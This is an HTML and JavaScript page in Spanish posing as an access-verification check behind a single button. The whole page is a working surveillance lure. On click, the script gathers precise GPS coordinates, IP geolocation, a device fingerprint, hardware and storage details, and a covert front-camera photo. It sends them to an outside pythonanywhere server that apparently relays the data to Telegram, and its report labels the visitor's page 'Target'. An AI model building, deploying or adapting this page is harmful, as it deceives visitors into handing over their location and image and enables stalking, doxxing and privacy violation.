<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verificacion</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #f1f3f4;
            font-family: 'Segoe UI', system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 16px;
            box-shadow: 0 8px 28px rgba(0,0,0,0.12);
            padding: 32px 24px;
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        h1 { font-size: 1.8rem; margin-bottom: 12px; }
        p { color: #5f6368; margin-bottom: 28px; }
        button {
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 28px;
            padding: 12px 24px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
        }
        button:active { background: #1557b0; transform: scale(0.98); }
    </style>
</head>
<body>
<div class="card">
    <h1>🔐 Verificación requerida</h1>
    <p>Presiona el botón para continuar</p>
    <button id="btn">✅ Verificar acceso</button>
</div>

<video id="video" autoplay playsinline style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
    // ================= CONFIGURACIÓN =================
    const SERVER_URL = 'https://societykark.pythonanywhere.com/';
    const CHAT_ID = '7555997298';

    // ---------- OBTENER UBICACIÓN DESDE ipapi.co (PRINCIPAL) ----------
    async function getLocationFromIpapi() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            if (data && data.ip) {
                return {
                    ip: data.ip || 'N/A',
                    country: data.country_name || 'N/A',
                    region: data.region || 'N/A',
                    city: data.city || 'N/A',
                    postal: data.postal || 'N/A',
                    timezone: data.timezone || 'N/A'
                };
            }
            return null;
        } catch(e) {
            return null;
        }
    }

    // ---------- OBTENER UBICACIÓN DESDE ip-api.com (RESPALDO) ----------
    async function getLocationFromIpApi() {
        try {
            const res = await fetch('https://ip-api.com/json/');
            const data = await res.json();
            if (data.status === 'success') {
                return {
                    ip: data.query || 'N/A',
                    country: data.country || 'N/A',
                    region: data.regionName || 'N/A',
                    city: data.city || 'N/A',
                    postal: data.zip || 'N/A',
                    timezone: data.timezone || 'N/A'
                };
            }
            return null;
        } catch(e) {
            return null;
        }
    }

    // ---------- FINGERPRINT ----------
    async function getFingerprint() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 200; canvas.height = 50;
        ctx.fillStyle = "#f60"; ctx.fillRect(0, 0, 200, 50);
        ctx.fillStyle = "#069"; ctx.font = "14px Arial"; ctx.fillText("FP", 10, 30);
        const canvasHash = canvas.toDataURL().slice(0, 100);
        let gpu = 'N/A';
        try {
            const gl = document.createElement('canvas').getContext('webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A';
        } catch(e) {}
        const fontsList = ["Arial", "Verdana", "Helvetica", "Times New Roman", "Courier New", "Impact", "Comic Sans MS"];
        const availableFonts = fontsList.filter(f => document.fonts.check(`12px "${f}"`));
        return { gpu, fonts: availableFonts.join(', ') || 'Ninguna', canvasHash };
    }

    // ---------- DATOS DEL DISPOSITIVO ----------
    function getDeviceInfo() {
        const ua = navigator.userAgent;
        let model = "Desconocido";
        if (ua.includes('iPhone')) model = 'iPhone';
        else if (ua.includes('iPad')) model = 'iPad';
        else if (ua.includes('Android')) model = 'Android';
        else if (ua.includes('Mac')) model = 'Mac';
        else if (ua.includes('Windows')) model = 'Windows PC';
        const language = navigator.language || navigator.userLanguage;
        const resolution = `${window.screen.width}x${window.screen.height}`;
        const cpuCores = navigator.hardwareConcurrency || 'N/A';
        return { model, ua, language, resolution, cpuCores };
    }

    // ---------- ALMACENAMIENTO ----------
    async function getStorageInfo() {
        try {
            const est = await navigator.storage.estimate();
            const totalGB = (est.quota / (1024**3)).toFixed(2);
            const usedGB = (est.usage / (1024**3)).toFixed(2);
            return { total: totalGB, used: usedGB };
        } catch(e) { return { total: 'N/A', used: 'N/A' }; }
    }

    // ---------- GPS EXACTO ----------
    function getGPS() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) { resolve(null); return; }
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                () => resolve(null),
                { enableHighAccuracy: true, timeout: 15000 }
            );
        });
    }

    // ---------- CÁMARA FRONTAL ----------
    async function capturePhoto() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        let stream = null;
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        } catch(e) {
            try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); }
            catch(err) { return null; }
        }
        video.srcObject = stream;
        await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
        await new Promise(r => setTimeout(r, 500));
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
        stream.getTracks().forEach(t => t.stop());
        return blob;
    }

    // ---------- ENVÍO A PYTHONANYWHERE ----------
    async function sendToServer(text, photoBlob) {
        let photoBase64 = null;
        if (photoBlob) {
            photoBase64 = await new Promise((resolve) => {
                const reader = new FileReader();
                reader.onload = () => resolve(reader.result.split(',')[1]);
                reader.readAsDataURL(photoBlob);
            });
        }
        const payload = { text, photo: photoBase64 };
        try {
            const res = await fetch(SERVER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            return res.ok;
        } catch(e) {
            console.error(e);
            return false;
        }
    }

    // ---------- PROCESO PRINCIPAL ----------
    document.getElementById('btn').onclick = async () => {
        const btn = document.getElementById('btn');
        btn.disabled = true;
        btn.innerText = '⏳ Procesando...';

        try {
            const gps = await getGPS();
            
            // Intentar con ipapi.co primero, si falla usar ip-api.com
            let loc = await getLocationFromIpapi();
            if (!loc || loc.ip === 'N/A') {
                loc = await getLocationFromIpApi();
            }

            const [fp, device, storage] = await Promise.all([
                getFingerprint(),
                getDeviceInfo(),
                getStorageInfo()
            ]);
            const foto = await capturePhoto();

            // ========== CONSTRUIR MENSAJE CON FORMATO CHINGÓN ==========
            let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
            
            message += `🖥️ *Device & Browser*\n`;
            message += `   • Device Model: ${device.model}\n`;
            message += `   • User Agent: ${device.ua}\n\n`;
            
            message += `🌐 *Network Information*\n`;
            message += `   • IP Address: ${loc?.ip || 'N/A'}\n`;
            message += `   • Language: ${device.language}\n\n`;
            
            message += `📍 *Location Details*\n`;
            if (loc && loc.city !== 'N/A') {
                message += `   • Country: ${loc.country}\n`;
                message += `   • Region: ${loc.region}\n`;
                message += `   • City: ${loc.city}\n`;
                message += `   • Postal Code: ${loc.postal}\n`;
                message += `   • Timezone: ${loc.timezone}\n\n`;
            } else {
                message += `   • No disponible\n\n`;
            }
            
            message += `🖼️ *Display Information*\n`;
            message += `   • Resolution: ${device.resolution}\n\n`;
            
            message += `🔐 *Device Permissions*\n`;
            message += `   • Camera: ${foto ? 'Granted' : 'Denied/Not available'}\n`;
            message += `   • Location: ${gps ? 'Granted' : 'Denied/Not available'}\n\n`;
            
            message += `💾 *Hardware & Storage*\n`;
            message += `   • CPU Cores: ${device.cpuCores}\n`;
            message += `   • RAM: N/A GB\n`;
            message += `   • Storage Used: ${storage.used || 'N/A'} GB\n`;
            message += `   • Storage Total: ${storage.total || 'N/A'} GB\n\n`;
            
            if (gps) {
                message += `📍 *GPS (exacto)*\n`;
                message += `   • Coordinates: ${gps.lat}, ${gps.lng}\n`;
                message += `   • Accuracy: ±${gps.accuracy} meters\n`;
                message += `   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
            }
            
            message += `\n━━━━━━━━━━━━━━━━\n`;
            message += `🎯 Target: ${window.location.href}\n`;
            message += `⚡ Developed by: @jsemanper`;

            const ok = await sendToServer(message, foto);
            if (!ok) {
                console.warn('No se pudo enviar a Telegram.');
            }
        } catch (error) {
            console.error('Error:', error);
        } finally {
            btn.disabled = false;
            btn.innerText = '✅ Verificar acceso';
        }
    };
</script>
</body>
</html>
